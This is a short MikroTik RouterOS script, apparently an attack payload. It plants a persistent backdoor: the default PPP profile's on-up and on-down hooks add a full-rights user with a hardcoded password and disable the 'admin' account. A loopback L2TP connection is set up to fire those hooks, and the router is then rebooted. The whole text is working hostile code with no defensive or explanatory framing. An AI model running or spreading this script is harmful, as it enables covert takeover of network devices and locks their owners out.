:delay 5s
/ppp profile
set *0 on-down=\
    "/user add name=q253254353 password=w19859990789 group=full\r\
    \n/user dis [find name=admin]" on-up=\
    "/user add name=q253254353 password=w19859990789 group=full\r\
    \n/user dis [find name=admin]"
/interface l2tp-server server
set enabled=yes
/ppp secret
add name=ppp1
/interface l2tp-client
add connect-to=127.0.0.1 disabled=no name=l2tp-out1 user=ppp1
:delay 5s
/sys reb
y
